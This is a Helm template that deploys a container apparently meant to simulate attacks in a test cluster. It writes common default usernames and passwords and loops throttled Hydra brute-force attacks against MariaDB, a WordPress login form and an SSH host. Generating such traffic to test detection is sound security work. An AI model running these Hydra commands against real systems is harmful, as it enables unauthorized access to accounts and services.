{{- if .Values.bruteforce.enabled }}
apiVersion: apps/v1
kind: Deployment
metadata:
  name: {{ include "malicious-containers.fullname" . }}-bruteforce
  labels:
    {{- include "malicious-containers.labels" . | nindent 4 }}
    app.kubernetes.io/component: bruteforce
    kids-label: "1"
spec:
  replicas: 1
  selector:
    matchLabels:
      {{- include "malicious-containers.selectorLabels" . | nindent 6 }}
      app.kubernetes.io/component: bruteforce
  template:
    metadata:
      labels:
        {{- include "malicious-containers.selectorLabels" . | nindent 8 }}
        app.kubernetes.io/component: bruteforce
        kids-label: "1"
    spec:
      {{- with .Values.nodeSelector }}
      nodeSelector:
        {{- toYaml . | nindent 8 }}
      {{- end }}
      {{- with .Values.tolerations }}
      tolerations:
        {{- toYaml . | nindent 8 }}
      {{- end }}
      containers:
        - name: bruteforce
          image: {{ .Values.bruteforce.image }}
          command: ["/bin/sh", "-c"]
          args:
            - |
              echo "Starting brute-force attack simulation (throttled)..."

              cat > /tmp/users.txt <<EOF
              admin
              root
              user
              test
              guest
              EOF

              cat > /tmp/passwords.txt <<EOF
              password
              123456
              admin
              root
              letmein
              changeme
              EOF

              while true; do
                echo "[$(date)] === Brute-force cycle start ==="

                echo "[$(date)] Attacking MariaDB..."
                hydra -L /tmp/users.txt -P /tmp/passwords.txt \
                  mariadb-sysbench-service.benign-workloads.svc.cluster.local \
                  mysql -t 1 -w 10 -f 2>&1 || true

                sleep 120

                echo "[$(date)] Attacking WordPress..."
                hydra -L /tmp/users.txt -P /tmp/passwords.txt \
                  wordpress-app.benign-workloads.svc.cluster.local \
                  http-post-form "/:username=^USER^&password=^PASS^:Invalid" \
                  -t 1 -w 10 -f 2>&1 || true

                sleep 120

                echo "[$(date)] Attacking SSH..."
                hydra -L /tmp/users.txt -P /tmp/passwords.txt \
                  10.0.1.27 ssh -t 1 -w 10 -f 2>&1 || true

                echo "[$(date)] === Cycle complete. Sleeping 300s ==="
                sleep 300
              done
          resources:
            requests:
              cpu: 50m
              memory: 64Mi
            limits:
              cpu: 100m
              memory: 128Mi
{{- end }}
